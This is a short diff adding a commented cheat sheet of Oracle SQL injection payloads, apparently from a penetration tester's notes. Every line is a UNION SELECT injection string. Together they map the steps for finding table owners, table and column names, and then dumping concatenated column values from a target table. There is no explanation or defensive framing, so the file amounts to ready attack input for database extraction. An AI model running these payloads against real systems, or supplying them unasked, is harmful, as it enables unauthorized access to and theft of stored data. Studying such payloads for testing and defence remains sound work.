@@ -1,0 +1,7 @@
+# ORACLE DATABASES
+#
+# 'union select NULL,NULL from dual-- -
+# 'union select NULL,owner from all_tables-- -
+# 'union select NULL,table_name from all_tables where owner = {...}-- -
+# 'union select NULL,column_name from all_tab_columns where table_name = {...}-- - 
+# 'union select NULL,foo||':'||bar from {table}-- -
